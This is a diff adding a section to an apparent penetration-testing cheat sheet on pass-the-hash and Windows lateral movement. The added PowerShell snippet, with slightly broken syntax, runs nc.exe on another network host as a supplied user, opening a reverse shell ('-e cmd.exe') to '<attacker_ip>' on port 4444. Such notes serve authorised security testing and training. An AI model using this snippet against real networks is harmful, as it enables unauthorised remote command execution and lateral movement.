@@ -162,6 +162,17 @@ $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:2fb3672702973ac1b9ade0acbdab432f
 
 ## Practical Usage PTH
 
+### Execute as another user
+
+Let's say you already have an admin account in network but you want to execute process under this account on antoher machine in network (like run-as). The following script may help:
+
+```
+$ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
+$ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
+$ computer = "<hostname>"
+[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
+```
+
 ### Pth-winexe
 
 This help us to get an interactive command line with the remote victim:
